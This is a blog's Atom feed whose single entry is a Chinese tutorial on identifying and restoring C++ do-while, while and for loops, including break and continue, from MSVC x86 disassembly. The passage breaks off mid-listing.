<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>m-Onst</title>
  
  <subtitle>Hi~ o(*￣▽￣*)ブ</subtitle>
  <link href="https://4st.tech/atom.xml" rel="self"/>
  
  <link href="https://4st.tech/"/>
  <updated>2021-09-01T05:08:56.351Z</updated>
  <id>https://4st.tech/</id>
  
  <author>
    <name>iforget</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>C++逆向：循环结构的分析、识别与还原</title>
    <link href="https://4st.tech/2021/09/01/c-ni-xiang-xun-huan-jie-gou-de-fen-xi-shi-bie-yu-huan-yuan/"/>
    <id>https://4st.tech/2021/09/01/c-ni-xiang-xun-huan-jie-gou-de-fen-xi-shi-bie-yu-huan-yuan/</id>
    <published>2021-09-01T03:33:52.000Z</published>
    <updated>2021-09-01T05:08:56.351Z</updated>
    
    <content type="html"><![CDATA[<p>循环结构是程序设计的三大结构之一，搞清楚它在反汇编下的代码特征对于逆向工程来说是非常重要的。对于<code>C/C++</code>来说，循环结构常见的有三种类型：<code>for</code>，<code>while</code>和<code>do...while</code>。本文会分析这三种情况分别在<code>VS2019</code>的<code>MSVC</code>或<code>VC6</code>的<code>MSVC</code>采用速度最快的优化选项后的表现形式及其还原方法，当<code>VC6</code>中的反汇编结果与<code>VS2019</code>中的一致时，则不再赘述。</p><p>…</p><h1>各种循环语句的分析</h1><h2 id="do-while循环的分析"><code>do...while</code>循环的分析</h2><p>示例代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nSum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span> </span><br><span class="line">    &#123;</span><br><span class="line">        nSum = nSum + i;</span><br><span class="line">        i++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (i &lt;= <span class="number">100</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, nSum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401040 _main           proc near               ; CODE XREF: __scrt_common_main_seh+F5↓p</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040 argc            = dword ptr  8</span><br><span class="line">.text:00401040 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040                 xor     ecx, ecx</span><br><span class="line">.text:00401042                 mov     eax, 1</span><br><span class="line">.text:00401047</span><br><span class="line">.text:00401047 LOOP_BEGIN:                             ; CODE XREF: _main+D↓j</span><br><span class="line">.text:00401047                 add     ecx, eax</span><br><span class="line">.text:00401049                 inc     eax</span><br><span class="line">.text:0040104A                 cmp     eax, 64h ; &#x27;d&#x27;</span><br><span class="line">.text:0040104D                 jle     short LOOP_BEGIN</span><br><span class="line">.text:0040104F                 push    ecx</span><br><span class="line">.text:00401050                 push    offset _Format  ; &quot;%d\r\n&quot;</span><br><span class="line">.text:00401055                 call    _printf</span><br><span class="line">.text:0040105A                 add     esp, 8</span><br><span class="line">.text:0040105D                 xor     eax, eax</span><br><span class="line">.text:0040105F                 retn</span><br><span class="line">.text:0040105F _main           endp</span><br></pre></td></tr></table></figure><p>观察其循环部分的特征：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00401047 LOOP_BEGIN:                             ; CODE XREF: _main+D↓j</span><br><span class="line">.text:00401047                 add     ecx, eax</span><br><span class="line">.text:00401049                 inc     eax</span><br><span class="line">.text:0040104A                 cmp     eax, 64h ; &#x27;d&#x27;</span><br><span class="line">.text:0040104D                 jle     short LOOP_BEGIN</span><br></pre></td></tr></table></figure><p>可以发现，其逻辑上是当<code>eax &lt;= 100</code>时就会继续执行循环体内部的代码，其逻辑与源代码的逻辑是一致的，无需对<code>jcc</code>的条件进行取反。</p><p>对永真条件的测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">    &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;always true\n&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00401060 loc_401060:                             ; CODE XREF: _main+2D↓j</span><br><span class="line">.text:00401060                 push    offset aAlwaysTrue ; &quot;always true\n&quot;</span><br><span class="line">.text:00401065                 call    _printf</span><br><span class="line">.text:0040106A                 add     esp, 4</span><br><span class="line">.text:0040106D                 jmp     short loc_401060</span><br></pre></td></tr></table></figure><p>可以总结<code>do...while</code>代码特征：<strong>只有一个跳转，且当比较后，条件跳转往上走的就是<code>do...while</code>循环结构。如果不是条件跳转，而是无条件跳转<code>jmp</code>的话，则表明是永真的循环。</strong></p><p>还原时，只需要找到<code>do...while</code>循环结构的边界：</p><ul><li><code>jcc</code>跳转所在地址处是<code>do...while</code>循环的下界，即：高级代码的右花括号<code>&#125;</code>的位置。</li><li><code>jcc</code>跳转后面接的地址是<code>do...while</code>循环的上界，即：高级代码的左花括号<code>&#123;</code>的位置</li></ul><p>找到这两个位置后，将循环条件取正作为<code>do...while</code>的循环条件；将标号和<code>jcc</code>跳转所包裹的代码作为<code>do...while</code>循环体内部的代码进行还原即可。</p><h2 id="while循环的分析"><code>while</code>循环的分析</h2><p>对于<code>while</code>的分析，需要注意，此时需要临时关闭优化选项，否则编译器会将下述示例代码优化为同<code>do...while</code>相同的结果。而对于优化为和<code>do...while</code>相同结果的，则不再赘述。</p><p><code>while</code>的代码实例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nSum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= <span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        nSum = nSum + i;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, nSum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:00401080 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401080 _main           proc near               ; CODE XREF: __scrt_common_main_seh+F5↓p</span><br><span class="line">.text:00401080</span><br><span class="line">.text:00401080 nSum            = dword ptr -8</span><br><span class="line">.text:00401080 i               = dword ptr -4</span><br><span class="line">.text:00401080 argc            = dword ptr  8</span><br><span class="line">.text:00401080 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401080 envp            = dword ptr  10h</span><br><span class="line">.text:00401080</span><br><span class="line">.text:00401080                 push    ebp</span><br><span class="line">.text:00401081                 mov     ebp, esp</span><br><span class="line">.text:00401083                 sub     esp, 8</span><br><span class="line">.text:00401086                 mov     [ebp+nSum], 0</span><br><span class="line">.text:0040108D                 mov     [ebp+i], 1</span><br><span class="line">.text:00401094</span><br><span class="line">.text:00401094 LOOP_BEGIN:                             ; CODE XREF: _main+2C↓j</span><br><span class="line">.text:00401094                 cmp     [ebp+i], 64h ; &#x27;d&#x27;</span><br><span class="line">.text:00401098                 jg      short LOOP_END</span><br><span class="line">.text:0040109A                 mov     eax, [ebp+nSum]</span><br><span class="line">.text:0040109D                 add     eax, [ebp+i]</span><br><span class="line">.text:004010A0                 mov     [ebp+nSum], eax</span><br><span class="line">.text:004010A3                 mov     ecx, [ebp+i]</span><br><span class="line">.text:004010A6                 add     ecx, 1</span><br><span class="line">.text:004010A9                 mov     [ebp+i], ecx</span><br><span class="line">.text:004010AC                 jmp     short LOOP_BEGIN</span><br><span class="line">.text:004010AE ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004010AE</span><br><span class="line">.text:004010AE LOOP_END:                               ; CODE XREF: _main+18↑j</span><br><span class="line">.text:004010AE                 mov     edx, [ebp+nSum]</span><br><span class="line">.text:004010B1                 push    edx</span><br><span class="line">.text:004010B2                 push    offset _Format  ; &quot;%d\r\n&quot;</span><br><span class="line">.text:004010B7                 call    _printf</span><br><span class="line">.text:004010BC                 add     esp, 8</span><br><span class="line">.text:004010BF                 xor     eax, eax</span><br><span class="line">.text:004010C1                 mov     esp, ebp</span><br><span class="line">.text:004010C3                 pop     ebp</span><br><span class="line">.text:004010C4                 retn</span><br><span class="line">.text:004010C4 _main           endp</span><br></pre></td></tr></table></figure><p>可以总结<code>while</code>循环结构的代码特征：</p><ul><li>有两处跳转，一处为条件跳转，另一处为绝对跳转。</li><li>条件跳转为下跳，绝对跳转为上跳</li><li>条件跳转处的条件为源代码中的循环条件的相反条件</li></ul><p>上述特征符合高级语法<code>while</code>的逻辑和汇编代码自身的逻辑。而在还原时，只需要找到其边界：</p><ul><li><code>jcc</code>条件跳转为下跳，它是代码的上界，即：高级代码的左花括号<code>&#123;</code>的位置</li><li><code>jmp</code>无条件跳转为上跳，它是代码的下界，即：高级代码的右花括号<code>&#125;</code>的位置</li></ul><p>还原时，只需要找到这两个边界后，将<code>jcc</code>条件取反后作为循环条件，两个边界中间的汇编代码还原为相对应的高级代码即可。</p><h2 id="for循环的分析"><code>for</code>循环的分析</h2><p>在对<code>for</code>循环的分析时，也需要暂时关闭优化选项，理由同<code>while</code>的分析。</p><p>示例代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nSum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">nSum = nSum + i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, nSum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.text:00401080 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401080 _main           proc near               ; CODE XREF: __scrt_common_main_seh+F5↓p</span><br><span class="line">.text:00401080</span><br><span class="line">.text:00401080 nSum            = dword ptr -8</span><br><span class="line">.text:00401080 i               = dword ptr -4</span><br><span class="line">.text:00401080 argc            = dword ptr  8</span><br><span class="line">.text:00401080 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401080 envp            = dword ptr  10h</span><br><span class="line">.text:00401080</span><br><span class="line">.text:00401080                 push    ebp</span><br><span class="line">.text:00401081                 mov     ebp, esp</span><br><span class="line">.text:00401083                 sub     esp, 8</span><br><span class="line">.text:00401086                 mov     [ebp+nSum], 0</span><br><span class="line">.text:0040108D</span><br><span class="line">.text:0040108D LOOP_BEGIN:</span><br><span class="line">.text:0040108D                 mov     [ebp+i], 1</span><br><span class="line">.text:00401094                 jmp     short LOOP_CMP</span><br><span class="line">.text:00401096 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401096</span><br><span class="line">.text:00401096 LOOP_STEP:                              ; CODE XREF: _main+2E↓j</span><br><span class="line">.text:00401096                 mov     eax, [ebp+i]</span><br><span class="line">.text:00401099                 add     eax, 1</span><br><span class="line">.text:0040109C                 mov     [ebp+i], eax</span><br><span class="line">.text:0040109F</span><br><span class="line">.text:0040109F LOOP_CMP:                               ; CODE XREF: _main+14↑j</span><br><span class="line">.text:0040109F                 cmp     [ebp+i], 64h ; &#x27;d&#x27;</span><br><span class="line">.text:004010A3                 jg      short LOOP_END</span><br><span class="line">.text:004010A5                 mov     ecx, [ebp+nSum]</span><br><span class="line">.text:004010A8                 add     ecx, [ebp+i]</span><br><span class="line">.text:004010AB                 mov     [ebp+nSum], ecx</span><br><span class="line">.text:004010AE                 jmp     short LOOP_STEP</span><br><span class="line">.text:004010B0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004010B0</span><br><span class="line">.text:004010B0 LOOP_END:                               ; CODE XREF: _main+23↑j</span><br><span class="line">.text:004010B0                 mov     edx, [ebp+nSum]</span><br><span class="line">.text:004010B3                 push    edx</span><br><span class="line">.text:004010B4                 push    offset _Format  ; &quot;%d\r\n&quot;</span><br><span class="line">.text:004010B9                 call    _printf</span><br><span class="line">.text:004010BE                 add     esp, 8</span><br><span class="line">.text:004010C1                 xor     eax, eax</span><br><span class="line">.text:004010C3                 mov     esp, ebp</span><br><span class="line">.text:004010C5                 pop     ebp</span><br><span class="line">.text:004010C6                 retn</span><br><span class="line">.text:004010C6 _main           endp</span><br></pre></td></tr></table></figure><p>可以观察到其有三个跳转，因此它的速度是会比<code>while</code>和<code>do...while</code>循环要慢的，因为它打断了流水线优化。还可以观察到，其明显的具有三个部分：</p><ul><li><code>LOOP_INIT</code>部分</li><li><code>LOOP_CMP</code>部分</li><li><code>LOOP_STEP</code>部分</li></ul><p>由于要符合高级语言<code>for</code>的逻辑要求：</p><ul><li>初始化部分只执行一次；</li><li>在执行循环体之前需要先判断一下循环条件；</li><li>在执行完循环体后再执行步长部分。</li></ul><p>故可以总结代码特征为：</p><ul><li>有三处跳转，一处条件跳转，两处绝对跳转。</li><li>条件跳转为<strong>下跳</strong>，跳转到循环体外部</li><li>第一处绝对跳转为<strong>下跳</strong>，跳转到<code>for</code>循环的比较部分</li><li>第二处绝对跳转为<strong>上跳</strong>，跳转到<code>for</code>循环的步长部分。</li></ul><p>掌握了<code>for</code>循环的代码特征后，还原也就简单了，只需要分别找到对应的几个部分进行还原即可。</p><h1>关键字<code>break</code>和<code>continue</code>的分析</h1><p>对于这两个部分的分析，我是打开<code>O2</code>了的优化。</p><h2 id="循环体内包含break关键字">循环体内包含<code>break</code>关键字</h2><p>示例代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i == argc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401040 _main           proc near               ; CODE XREF: __scrt_common_main_seh+F5↓p</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040 argc            = dword ptr  8</span><br><span class="line">.text:00401040 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401040 envp            = dword ptr  10h</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040                 push    ebp</span><br><span class="line">.text:00401041                 mov     ebp, esp</span><br><span class="line">.text:00401043                 push    esi</span><br><span class="line">.text:00401044                 push    edi</span><br><span class="line">.text:00401045                 mov     edi, [ebp+argc]</span><br><span class="line">.text:00401048                 mov     esi, 1</span><br><span class="line">.text:0040104D                 nop     dword ptr [eax]</span><br><span class="line">.text:00401050</span><br><span class="line">.text:00401050 LOOP_BEGIN:                             ; CODE XREF: _main+26↓j</span><br><span class="line">.text:00401050                 cmp     esi, edi</span><br><span class="line">.text:00401052                 jz      short LOOP_END</span><br><span class="line">.text:00401054                 push    esi</span><br><span class="line">.text:00401055                 push    offset _Format  ; &quot;%d\r\n&quot;</span><br><span class="line">.text:0040105A                 call    _printf</span><br><span class="line">.text:0040105F                 inc     esi</span><br><span class="line">.text:00401060                 add     esp, 8</span><br><span class="line">.text:00401063                 cmp     esi, 64h ; &#x27;d&#x27;</span><br><span class="line">.text:00401066                 jle     short LOOP_BEGIN</span><br><span class="line">.text:00401068</span><br><span class="line">.text:00401068 LOOP_END:                               ; CODE XREF: _main+12↑j</span><br><span class="line">.text:00401068                 pop     edi</span><br><span class="line">.text:00401069                 xor     eax, eax</span><br><span class="line">.text:0040106B                 pop     esi</span><br><span class="line">.text:0040106C                 pop     ebp</span><br><span class="line">.text:0040106D                 retn</span><br><span class="line">.text:0040106D _main           endp</span><br></pre></td></tr></table></figure><p>可以发现，其已经将<code>for</code>循环，优化成了<code>do...while</code>的循环了。而在这个循环体内部，还有一个条件跳转：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00401050                 cmp     esi, edi</span><br><span class="line">.text:00401052                 jz      short LOOP_END</span><br></pre></td></tr></table></figure><p>经过分析后，可以得出，其是跳转到循环体外部的，也就是符合了<code>break</code>关键字的逻辑要求：<strong>结束循环，转到执行循环体外部的代码</strong>。</p><p>在还原时，可以根据出现在循环体内部的情况，来具体根据关键字的语义来还原。</p><h2 id="循环体内包含continue关键字">循环体内包含<code>continue</code>关键字</h2><p>示例代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i == argc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, i) :</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编的结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401040 _main           proc near               ; CODE XREF: __scrt_common_main_seh+F5↓p</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040 argc            = dword ptr  8</span><br><span class="line">.text:00401040 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401040 envp            = dword ptr  10h</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040                 push    ebp</span><br><span class="line">.text:00401041                 mov     ebp, esp</span><br><span class="line">.text:00401043                 push    esi</span><br><span class="line">.text:00401044                 push    edi</span><br><span class="line">.text:00401045                 mov     edi, [ebp+argc]</span><br><span class="line">.text:00401048                 mov     esi, 1</span><br><span class="line">.text:0040104D                 nop     dword ptr [eax]</span><br><span class="line">.text:00401050</span><br><span class="line">.text:00401050 LOOP_BEGIN:                             ; CODE XREF: _main+26↓j</span><br><span class="line">.text:00401050                 cmp     esi, edi</span><br><span class="line">.text:00401052                 jz      short LOOP_STEP</span><br><span class="line">.text:00401054                 push    esi</span><br><span class="line">.text:00401055                 push    offset _Format  ; &quot;%d\r\n&quot;</span><br><span class="line">.text:0040105A                 call    _printf</span><br><span class="line">.text:0040105F                 add     esp, 8</span><br><span class="line">.text:00401062</span><br><span class="line">.text:00401062 LOOP_STEP:                              ; CODE XREF: _main+12↑j</span><br><span class="line">.text:00401062                 inc     esi</span><br><span class="line">.text:00401063</span><br><span class="line">.text:00401063 LOOP_CMP:</span><br><span class="line">.text:00401063                 cmp     esi, 64h ; &#x27;d&#x27;</span><br><span class="line">.text:00401066                 jle     short LOOP_BEGIN</span><br><span class="line">.text:00401068</span><br><span class="line">.text:00401068 LOOP_END:</span><br><span class="line">.text:00401068                 pop     edi</span><br><span class="line">.text:00401069                 xor     eax, eax</span><br><span class="line">.text:0040106B                 pop     esi</span><br><span class="line">.text:0040106C                 pop     ebp</span><br><span class="line">.text:0040106D                 retn</span><br><span class="line">.text:0040106D _main           endp</span><br></pre></td></tr></table></figure><p>可以发现，其也是将其优化成了<code>do...while</code>了。再进一步分析，可以得出一个类似于满足<code>for</code>循环的语义的几个部分。在还原时可以按照自己的喜好和代码可读性，还原为任意一种循环即可。</p><p>在分析上述反汇编时，可以看到一处条件跳转：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00401050 LOOP_BEGIN:                             ; CODE XREF: _main+26↓j</span><br><span class="line">.text:00401050                 cmp     esi, edi</span><br><span class="line">.text:00401052                 jz      short LOOP_STEP</span><br></pre></td></tr></table></figure><p>其就是关键字<code>continue</code>的语义：提前结束本次循环，进入下一次循环。</p><h2 id="循环体内包含break关键字造成的特殊优化现象">循环体内包含<code>break</code>关键字造成的特殊优化现象</h2><p>示例代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:00401040 ; int 